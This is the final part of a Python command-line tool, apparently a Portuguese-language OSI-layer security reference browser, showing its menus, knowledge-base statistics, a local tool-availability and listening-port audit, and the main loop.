        console.print(f"  [dim][4][/] Ver apenas mitigações resumidas")
        console.print(f"  [dim][0][/] Voltar ao menu principal\n")
        choice = Prompt.ask(f"  [{col}]Opção[/]", default="0")
        if choice == "1":
            show_layer(layer_num)
            Prompt.ask("\n  [dim]Pressiona ENTER para continuar[/]", default="")
        elif choice == "2":
            show_layer_attacks_table(layer_num)
            Prompt.ask("\n  [dim]Pressiona ENTER para continuar[/]", default="")
        elif choice == "3":
            full_report(layer_num)
            Prompt.ask("\n  [dim]Pressiona ENTER para continuar[/]", default="")
        elif choice == "4":
            console.print(Rule("[bold bright_cyan]MITIGAÇÕES RESUMIDAS[/]", style="bright_cyan"))
            for atk in layer["attacks"]:
                console.print(f"\n[bold red]{atk['name']}[/]")
                for m in atk["mitigation"]:
                    console.print(f"  [bright_cyan]→[/] {m}")
            Prompt.ask("\n  [dim]Pressiona ENTER para continuar[/]", default="")
        elif choice == "0":
            break

def quick_stats():
    """Estatísticas rápidas da base de conhecimento"""
    total_attacks  = sum(len(l["attacks"]) for l in OSI_LAYERS.values())
    total_atk_cmds = sum(len(a["tools_atk"]) for l in OSI_LAYERS.values() for a in l["attacks"])
    total_def_cmds = sum(len(a["defense_commands"]) for l in OSI_LAYERS.values() for a in l["attacks"])
    total_tools    = sum(len(l.get("tools_defense",{})) for l in OSI_LAYERS.values())
    critical       = sum(1 for l in OSI_LAYERS.values() for a in l["attacks"] if a["risk"]=="CRÍTICO")

    table = Table(box=box.MINIMAL_DOUBLE_HEAD, border_style="bright_cyan", show_header=False,
                  title="📊  BASE DE CONHECIMENTO — ESTATÍSTICAS", title_style="bold bright_white")
    table.add_column("Métrica", style="bright_cyan", width=35)
    table.add_column("Valor",   style="bold white",  width=10, justify="right")
    rows = [
        ("Camadas OSI cobertas",      "7"),
        ("Total de ataques documentados", str(total_attacks)),
        ("Ataques CRÍTICOS",          str(critical)),
        ("Comandos de ataque (lab)",  str(total_atk_cmds)),
        ("Comandos de defesa",        str(total_def_cmds)),
        ("Ferramentas de defesa",     str(total_tools)),
        ("Cenários reais",            str(total_attacks)),
    ]
    for m, v in rows:
        table.add_row(m, v)
    console.print(table)

# ══════════════════════════════════════════════════════════════════════════════
# ██  POWERSHELL HELPERS
# ══════════════════════════════════════════════════════════════════════════════
def check_tool(tool: str) -> bool:
    return shutil.which(tool) is not None

def system_audit():
    """Auditoria básica de segurança do sistema actual"""
    console.print(Rule("[bold bright_yellow]🔍 AUDITORIA DO SISTEMA[/]", style="bright_yellow"))
    console.print()

    # OS info
    console.print(Panel(
        f"[bold bright_cyan]Sistema:[/] {platform.system()} {platform.release()}\n"
        f"[bold bright_cyan]Versão:[/]  {platform.version()[:60]}\n"
        f"[bold bright_cyan]Python:[/]  {sys.version.split()[0]}\n"
        f"[bold bright_cyan]Data:[/]    {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        title="ℹ️  Informação do Sistema", border_style="bright_cyan", padding=(0,2)
    ))

    # Tool availability
    tools = [
        ("nmap",       "Port scanning"),
        ("wireshark",  "Packet analysis"),
        ("tcpdump",    "Packet capture"),
        ("python3",    "Scripting"),
        ("openssl",    "TLS analysis"),
        ("curl",       "HTTP requests"),
        ("netstat",    "Connection monitoring"),
        ("iptables",   "Firewall (Linux)"),
        ("snort",      "IDS/IPS"),
        ("fail2ban-client","Brute force protection"),
    ]

    tool_table = Table(title="🔧 Ferramentas Disponíveis", box=box.SIMPLE_HEAD,
                       border_style="dim", header_style="bold bright_cyan")
    tool_table.add_column("Ferramenta", width=22)
    tool_table.add_column("Função",     width=28)
    tool_table.add_column("Status",     width=12, justify="center")
    for name, desc in tools:
        status = "[bold green]✅ INSTALADO[/]" if check_tool(name) else "[dim red]❌ Ausente[/]"
        tool_table.add_row(name, desc, status)
    console.print(tool_table)

    # Basic network check
    if not IS_WINDOWS:
        try:
            result = subprocess.run(["ss", "-tuln"], capture_output=True, text=True, timeout=5)
            listening = [l for l in result.stdout.splitlines() if "LISTEN" in l]
            if listening:
                console.print(Panel(
                    "[bold yellow]PORTAS EM ESCUTA (ss -tuln):[/]\n" +
                    "\n".join(listening[:15]),
                    border_style="yellow", padding=(0,2)
                ))
        except Exception:
            pass

# ══════════════════════════════════════════════════════════════════════════════
# ██  MAIN LOOP
# ══════════════════════════════════════════════════════════════════════════════
def main():
    # Handle CLI args (para uso em scripts PowerShell)
    args = sys.argv[1:]
    if args:
        cmd = args[0].lower()
        if cmd in ["-h","--help","help","?"]:
            console.print(Panel(
                "[bold bright_cyan]AOFR TECH OSI RESOLVER — MODO CLI[/]\n\n"
                "  python aofr_osi_resolver.py              # Menu interactivo\n"
                "  python aofr_osi_resolver.py 7            # Camada 7 directamente\n"
                "  python aofr_osi_resolver.py search SQLi  # Pesquisar ataque\n"
                "  python aofr_osi_resolver.py defense nmap # Pesquisar defesa\n"
                "  python aofr_osi_resolver.py audit        # Auditoria do sistema\n"
                "  python aofr_osi_resolver.py stats        # Estatísticas\n\n"
                "  [dim]PowerShell: python .\\aofr_osi_resolver.py 7\n"
                "  Linux/Mac:  python3 aofr_osi_resolver.py search arp[/]",
                border_style="bright_cyan"
            ))
            return
        if cmd == "audit":
            banner(); system_audit(); return
        if cmd == "stats":
            banner(); osi_overview(); quick_stats(); return
        if cmd == "search" and len(args) > 1:
            banner(); search_attack(" ".join(args[1:])); return
        if cmd == "defense" and len(args) > 1:
            banner(); search_defense_tool(" ".join(args[1:])); return
        if cmd.isdigit() and 1 <= int(cmd) <= 7:
            banner(); show_layer(int(cmd)); return

    # Interactive menu
    banner()
    osi_overview()
    quick_stats()

    while True:
        console.print()
        show_layer_menu()
        choice = Prompt.ask("  [bold bright_cyan]AOFR >[/]", default="Q").strip().upper()

        if choice == "Q" or choice == "0" and False:
            console.print(Panel(
                "[bold bright_cyan]AOFR TECH — OSI RESOLVER[/]\n"
                "[dim]Atitude · Orientação · Força · Resultados[/]\n\n"
                "[italic]\"O conhecimento é a melhor defesa.\"[/]\n"
                "[dim]Alfredo Ociola Francisco Romano — Angola[/]",
                border_style="bright_cyan", padding=(1,4)
            ))
            break
        elif choice.isdigit() and 1 <= int(choice) <= 7:
            layer_submenu(int(choice))
        elif choice == "0":
            osi_overview()
            quick_stats()
        elif choice == "A":
            kw = Prompt.ask("  [bright_yellow]Pesquisar ataque (ex: ARP, SQLi, DDoS)[/]")
            search_attack(kw)
            Prompt.ask("\n  [dim]ENTER para continuar[/]", default="")
        elif choice == "D":
            kw = Prompt.ask("  [bright_green]Pesquisar ferramenta de defesa (ex: nmap, waf, snort)[/]")
            search_defense_tool(kw)
            Prompt.ask("\n  [dim]ENTER para continuar[/]", default="")
        elif choice == "R":
            n = IntPrompt.ask("  Número da camada (1-7)", default=7)
            if 1 <= n <= 7:
                full_report(n)
            Prompt.ask("\n  [dim]ENTER para continuar[/]", default="")
        else:
            console.print("[dim red]Opção inválida. Tenta de novo.[/]")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[dim]\n  Ctrl+C detectado. A sair... AOFR TECH.[/]")
        sys.exit(0)
    except Exception as e:
        console.print_exception()
        sys.exit(1)
